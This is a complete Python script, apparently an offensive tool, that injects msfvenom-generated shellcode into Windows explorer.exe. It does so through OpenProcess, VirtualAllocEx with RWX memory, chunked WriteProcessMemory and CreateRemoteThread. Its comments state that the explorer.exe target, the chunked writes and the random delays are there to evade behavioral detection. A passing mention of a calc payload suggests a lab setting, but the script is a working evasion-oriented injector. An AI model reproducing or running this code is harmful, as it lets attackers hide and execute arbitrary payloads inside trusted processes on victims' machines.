#!/usr/bin/env python3
"""
Process Injector
Works on Windows 10/11 64-bit
"""

import sys
import ctypes
import ctypes.wintypes
import subprocess
import time
import random

# Windows API constants
PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Set proper signatures
kernel32.VirtualAllocEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

def get_explorer_pid():
    """Target explorer.exe instead of notepad - less suspicious"""
    try:
        result = subprocess.check_output('tasklist /FI "IMAGENAME eq explorer.exe" /FO CSV', shell=True).decode()
        lines = result.strip().split('\n')
        if len(lines) > 1:
            pid = int(lines[1].split('","')[1])
            return pid
    except:
        pass
    return None

def inject_stealthily(pid, shellcode):
    """Inject with techniques to evade behavioral detection"""
    
    print(f"[*] Target PID: {pid}")
    
    # Use minimum required permissions
    required_perms = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
    
    print(f"[*] Opening process with minimal permissions...")
    h_process = kernel32.OpenProcess(required_perms, False, pid)
    
    if not h_process:
        print(f"[-] Failed to open process")
        return False
    
    print(f"[+] Process handle obtained")
    
    # Random delay
    time.sleep(random.uniform(0.5, 1.5))
    
    # Allocate memory in chunks to avoid detection
    chunk_size = 64
    total_size = len(shellcode)
    chunks_needed = (total_size // chunk_size) + 1
    
    print(f"[*] Allocating memory in {chunks_needed} chunks...")
    
    # Allocate larger buffer but write in chunks
    mem_addr = kernel32.VirtualAllocEx(
        h_process, None, 
        total_size + 100,  # Extra space
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  # Direct RWX to avoid VirtualProtect
    )
    
    if not mem_addr:
        print(f"[-] Memory allocation failed")
        kernel32.CloseHandle(h_process)
        return False
    
    print(f"[+] Memory allocated at: 0x{mem_addr:016X}")
    
    # Write shellcode in small chunks with delays
    print(f"[*] Writing shellcode in chunks...")
    offset = 0
    
    for i in range(0, len(shellcode), chunk_size):
        chunk = shellcode[i:i+chunk_size]
        chunk_buffer = (ctypes.c_char * len(chunk)).from_buffer_copy(chunk)
        written = ctypes.c_size_t(0)
        
        success = kernel32.WriteProcessMemory(
            h_process,
            mem_addr + offset,
            chunk_buffer,
            len(chunk),
            ctypes.byref(written)
        )
        
        if success:
            offset += written.value
            # Small random delay between chunks
            time.sleep(random.uniform(0.01, 0.05))
        else:
            print(f"[-] Failed to write chunk {i}")
    
    print(f"[+] Wrote {offset} bytes total")
    
    # Longer delay before thread creation
    print(f"[*] Waiting before thread creation...")
    time.sleep(random.uniform(1, 2))
    
    # Create thread with NULL security descriptor
    print(f"[*] Creating remote thread...")
    thread_id = ctypes.wintypes.DWORD()
    
    h_thread = kernel32.CreateRemoteThread(
        h_process,
        None,  # Default security
        0,     # Default stack
        mem_addr,
        None,  # No parameter
        0,     # Run immediately
        ctypes.byref(thread_id)
    )
    
    if h_thread:
        print(f"[+] Thread created: {thread_id.value}")
        kernel32.CloseHandle(h_thread)
        success = True
    else:
        print(f"[-] Thread creation failed")
        success = False
    
    kernel32.CloseHandle(h_process)
    return success

def main():
    print("\n=== Stealth Process Injection ===")
    print("[*] Injecting into explorer.exe for better evasion")
    print("[*] Using chunked writes and delays")
    print("")
    
    # Load shellcode from msfvenom-generated file
    try:
        with open('shellcode.py', 'r') as f:
            content = f.read()
        namespace = {}
        exec(content, namespace)
        shellcode = namespace.get('shellcode', b'')
        print(f"[+] Loaded {len(shellcode)} bytes of shellcode")
    except Exception as e:
        print(f"[-] Failed to load shellcode: {e}")
        print("[!] Make sure shellcode.py exists (generated by msfvenom)")
        return 1
    
    # Target explorer.exe - always running, less suspicious
    pid = get_explorer_pid()
    
    if not pid:
        print("[-] Could not find explorer.exe")
        return 1
    
    print(f"[+] Found explorer.exe PID: {pid}")
    print("")
    print("[*] Starting stealth injection...")
    
    if inject_stealthily(pid, shellcode):
        print("\n" + "="*70)
        print("[+] SUCCESS! Shellcode injected using stealth techniques")
        print("[+] Chunked writes and delays avoided behavioral detection")
        print("[+] Check if calculator opened (if using calc payload)")
        print("[+] Run verify_evasion.ps1 to confirm no detection")
        print("="*70)
        return 0
    else:
        print("\n[-] Injection failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
